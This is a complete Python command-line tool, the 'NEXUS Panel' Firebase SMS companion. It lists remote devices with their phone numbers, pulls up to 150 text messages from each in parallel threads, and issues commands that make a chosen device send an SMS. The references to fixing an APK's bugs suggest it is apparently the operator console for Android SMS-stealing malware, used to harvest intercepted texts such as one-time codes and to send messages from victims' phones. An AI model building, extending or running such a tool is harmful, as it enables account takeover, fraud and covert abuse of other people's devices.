"""
NEXUS Panel - Firebase SMS Companion
Language: Python 3.10+  Target: Firebase Realtime Database (NEXUS Panel 1.0 backend)

Changes vs APK bugs:
  - getLatestSms (limitToLast=1)  →  limitToLast=150 per device
  - SMS send: async background thread, 10s timeout, non-blocking
  - All-device fetch: parallel threads
"""

import sys
import json
import time
import threading
import urllib.request
import urllib.parse
import urllib.error
import argparse
from datetime import datetime, timezone


# ─────────────────────────────────────────────────────────────────────────────
class FirebaseREST:
    def __init__(self, url: str, token: str = ""):
        self.base = url.rstrip("/")
        self.token = token

    def _build_url(self, path: str, **params) -> str:
        if self.token:
            params["auth"] = self.token
        qs = urllib.parse.urlencode(params)
        return f"{self.base}{path}?{qs}" if qs else f"{self.base}{path}"

    def get(self, path: str, order_by: str = None, limit_last: int = None,
            start_at=None, timeout: int = 10) -> dict | None:
        kw: dict = {}
        if order_by:
            kw["orderBy"] = f'"{order_by}"'
        if limit_last:
            kw["limitToLast"] = limit_last
        if start_at is not None:
            kw["startAt"] = start_at
        url = self._build_url(path, **kw)
        try:
            with urllib.request.urlopen(urllib.request.Request(url), timeout=timeout) as r:
                raw = r.read().decode()
                return json.loads(raw) if raw and raw != "null" else None
        except Exception as e:
            print(f"  [GET] {path}: {e}", file=sys.stderr)
            return None

    def put(self, path: str, data: dict, timeout: int = 10) -> dict | None:
        return self._write("PUT",  path, data, timeout)

    def patch(self, path: str, data: dict, timeout: int = 10) -> dict | None:
        return self._write("PATCH", path, data, timeout)

    def post(self, path: str, data: dict, timeout: int = 10) -> dict | None:
        return self._write("POST", path, data, timeout)

    def _write(self, method: str, path: str, data: dict, timeout: int) -> dict | None:
        url  = self._build_url(path)
        body = json.dumps(data).encode()
        req  = urllib.request.Request(url, data=body, method=method)
        req.add_header("Content-Type", "application/json")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                raw = r.read().decode()
                return json.loads(raw) if raw and raw != "null" else {}
        except urllib.error.HTTPError as e:
            print(f"  [HTTP {e.code}] {path}: {e.reason}", file=sys.stderr)
            return None
        except Exception as e:
            print(f"  [{method}] {path}: {e}", file=sys.stderr)
            return None


# ─────────────────────────────────────────────────────────────────────────────

def fetch_devices(fb: FirebaseREST) -> list[dict]:
    data = fb.get("/devices.json")
    if not isinstance(data, dict):
        return []
    out = []
    for did, info in data.items():
        if isinstance(info, dict):
            info = dict(info)
            info["_id"] = did
            out.append(info)
    return out


def fetch_all_sms(fb: FirebaseREST, limit: int = 150) -> list[dict]:
    """
    Fetch last `limit` SMS from every device — parallel per-device threads.
    Checks both /allSms/{id}/ and /deviceMessages/{id}/ paths.
    Returns flat list sorted newest-first.
    """
    devices = fetch_devices(fb)
    device_ids = [d["_id"] for d in devices]

    if not device_ids:
        # flat fallback
        data = fb.get("/allSms.json", order_by="$key", limit_last=limit)
        return _flatten(data, "")

    all_sms: list[dict] = []
    lock = threading.Lock()

    def fetch_one(did: str):
        msgs: list[dict] = []
        for path in (f"/allSms/{did}.json", f"/deviceMessages/{did}.json"):
            data = fb.get(path, order_by="$key", limit_last=limit)
            msgs.extend(_flatten(data, did))
        # dedup within device
        seen: set[str] = set()
        uniq: list[dict] = []
        for m in msgs:
            k = _key(m)
            if k not in seen:
                seen.add(k)
                uniq.append(m)
        with lock:
            all_sms.extend(uniq)

    threads = [threading.Thread(target=fetch_one, args=(d,), daemon=True)
               for d in device_ids]
    for t in threads: t.start()
    for t in threads: t.join(timeout=15)

    all_sms.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
    return all_sms


def _flatten(data, device_id: str) -> list[dict]:
    if not isinstance(data, dict):
        return []
    out = []
    for v in data.values():
        if isinstance(v, dict):
            v = dict(v)
            v.setdefault("_deviceId", device_id)
            out.append(v)
    return out


def _key(sms: dict) -> str:
    return "{}|{}|{}".format(
        sms.get("_deviceId", ""),
        sms.get("timestamp", 0),
        sms.get("sender", sms.get("from", ""))[:12],
    )


# ─────────────────────────────────────────────────────────────────────────────
# SMS Send — async, non-blocking, dual-path fallback
# ─────────────────────────────────────────────────────────────────────────────

def send_sms_command(fb: FirebaseREST, device_id: str, to: str, body: str,
                     sim_slot: int = 0, callback=None) -> threading.Thread:
    """
    Non-blocking SMS send. Writes to /commands/{deviceId}/sendSms first,
    falls back to /sendSms.json. 10s timeout. Calls callback(ok, msg) when done.
    """
    cmd = {
        "type":      "sendSms",
        "to":        to,
        "body":      body,
        "simSlot":   sim_slot,
        "timestamp": int(time.time() * 1000),
    }

    def _run():
        # primary
        r = fb.put(f"/commands/{device_id}/sendSms.json", cmd, timeout=10)
        if r is not None:
            if callback: callback(True, f"SMS command sent → device {device_id}")
            return
        # fallback (legacy APK path)
        r = fb.post("/sendSms.json", {"deviceId": device_id, **cmd}, timeout=10)
        if r is not None:
            if callback: callback(True, f"SMS sent (fallback) → {device_id}")
            return
        if callback: callback(False, "Firebase write failed — device offline?")

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


# ─────────────────────────────────────────────────────────────────────────────
# Display
# ─────────────────────────────────────────────────────────────────────────────

def fmt_ts(ms: int) -> str:
    if not ms: return "—"
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc).astimezone()\
                   .strftime("%Y-%m-%d %H:%M:%S")


def print_sms_table(sms_list: list[dict]):
    if not sms_list:
        print("  (no SMS found)")
        return
    W = {"dev": 14, "sender": 18, "body": 50, "ts": 19}
    hdr = f"{'DEVICE':<{W['dev']}}  {'SENDER':<{W['sender']}}  {'BODY':<{W['body']}}  {'TIME'}"
    sep = "─" * (len(hdr) + 4)
    print(sep); print(hdr); print(sep)
    for s in sms_list:
        dev    = str(s.get("_deviceId", s.get("deviceId", "?")))[:W["dev"]]
        sender = str(s.get("sender",    s.get("from",     "?")))[:W["sender"]]
        body   = str(s.get("body", s.get("text", s.get("message", "")))).replace("\n", " ")[:W["body"]]
        ts     = fmt_ts(s.get("timestamp", 0))
        print(f"{dev:<{W['dev']}}  {sender:<{W['sender']}}  {body:<{W['body']}}  {ts}")
    print(sep)
    print(f"  Total: {len(sms_list)} SMS")


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="NEXUS Panel — Firebase SMS CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  list-sms    [--limit N]                    Fetch last N SMS per device (default 150)
  list-devices                               Show all connected devices
  send-sms    --device ID --to NUM --body T  Send SMS via device (async, non-blocking)

Examples:
  python3 firebase_sms.py --url https://xxx-default-rtdb.firebaseio.com list-sms
  python3 firebase_sms.py --url https://xxx-default-rtdb.firebaseio.com list-sms --limit 100
  python3 firebase_sms.py --url https://xxx-default-rtdb.firebaseio.com send-sms \\
      --device abc123 --to +919876543210 --body "Hello"
""")
    ap.add_argument("--url",   required=True, help="Firebase Realtime DB URL")
    ap.add_argument("--token", default="",    help="Firebase auth token (optional)")

    sub = ap.add_subparsers(dest="cmd")

    p_sms = sub.add_parser("list-sms")
    p_sms.add_argument("--limit", type=int, default=150,
                       help="SMS per device to load (default 150)")

    sub.add_parser("list-devices")

    p_send = sub.add_parser("send-sms")
    p_send.add_argument("--device", required=True)
    p_send.add_argument("--to",     required=True)
    p_send.add_argument("--body",   required=True)
    p_send.add_argument("--sim",    type=int, default=0, choices=[0, 1])

    args = ap.parse_args()
    if not args.cmd:
        ap.print_help(); return

    fb = FirebaseREST(args.url, args.token)

    if args.cmd == "list-devices":
        print("\n[Devices]")
        devs = fetch_devices(fb)
        if not devs: print("  No devices."); return
        for d in devs:
            print(f"  {d['_id']}  {d.get('model', d.get('name','?')):<20}"
                  f"  {d.get('phone', d.get('phoneNumber','?')):<15}"
                  f"  last: {fmt_ts(d.get('lastSeen', d.get('timestamp', 0)))}")
        print(f"\n  {len(devs)} device(s)")

    elif args.cmd == "list-sms":
        print(f"\n[SMS — last {args.limit} per device, all devices]")
        sms = fetch_all_sms(fb, args.limit)
        print_sms_table(sms)

    elif args.cmd == "send-sms":
        print(f"\n[Send SMS] device={args.device}  to={args.to}")
        done = threading.Event()
        result: dict = {}

        def cb(ok, msg):
            result["ok"]  = ok
            result["msg"] = msg
            done.set()

        send_sms_command(fb, args.device, args.to, args.body, args.sim, cb)
        done.wait(timeout=15)
        if result.get("ok"):
            print(f"  OK: {result['msg']}")
        else:
            print(f"  FAIL: {result.get('msg', 'timeout')}", file=sys.stderr)
            sys.exit(1)


if __name__ == "__main__":
    main()
